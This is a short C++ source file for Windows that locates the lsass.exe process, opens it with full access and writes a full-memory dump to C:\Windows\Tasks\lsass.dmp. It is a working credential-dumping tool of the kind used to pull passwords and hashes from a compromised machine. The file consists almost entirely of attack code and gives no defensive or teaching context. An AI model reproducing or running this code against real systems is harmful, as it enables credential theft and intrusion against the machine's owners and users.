#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <string>
#include <Dbghelp.h>

/*
This will dump LSASS and write the dump to disk
Location: C:\Windows\Tasks\lsass.dmp
*/

DWORD FindProcessId(const std::wstring& processName)
{
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);
    DWORD pid = 0;


    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;

    Process32First(processesSnapshot, &processInfo);
    if (!processName.compare(processInfo.szExeFile))
    {
        CloseHandle(processesSnapshot);
        pid = processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo))
    {
        if (!processName.compare(processInfo.szExeFile))
        {
            CloseHandle(processesSnapshot);
            pid = processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);
    return pid;
}


int main() 
{
    BOOL minidump;
	HANDLE lsaProc;
    DWORD lsaPID;

    // File structure
    OFSTRUCT lpReOpenBuff{};

    HFILE openFile;

    lsaPID = FindProcessId(L"lsass.exe");
    printf("[+] LSASS PID: %d\n", lsaPID);

	lsaProc = OpenProcess(PROCESS_ALL_ACCESS, false, lsaPID);

	char location[] = "C:\\windows\\tasks\\lsass.dmp";
	printf("[*] Dumping LSASS to %s\n", location);

    HANDLE outFile = CreateFileA(location, GENERIC_ALL, 0, NULL, 2, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!outFile) {
        printf("[-] Error creating file %s\n", location);
        printf("[-] Error: %d", GetLastError());
        return -2;
    }
    //printf("Handle to CreateFileA Success: %p\n", outFile);

    openFile = OpenFile(location, &lpReOpenBuff, OF_READWRITE);
    if (!openFile) {
        printf("[-] Error openinig file %s\n", location);
        printf("[-] Error: %d", GetLastError());
        return -2;
    }

    minidump = MiniDumpWriteDump(lsaProc, lsaPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if (minidump == false) {
        printf("[-] Dumping failed ! ERROR: %d\n", GetLastError());
        return -2;
    }
    //printf("MiniDumpWriteDump Success !\n");
    /*
    DWORD bytesWritten;
    if (!WriteFile(outFile, &minidump, lpReOpenBuff.cBytes, &bytesWritten, NULL)) {
        
        printf("[-] Failed writing LSASS dump ! ERROR: %d\n", GetLastError());
        return -2;
    }
    */

    printf("[+] LSASS dumped to %s\n", location);
    CloseHandle(outFile);
	return 0;
}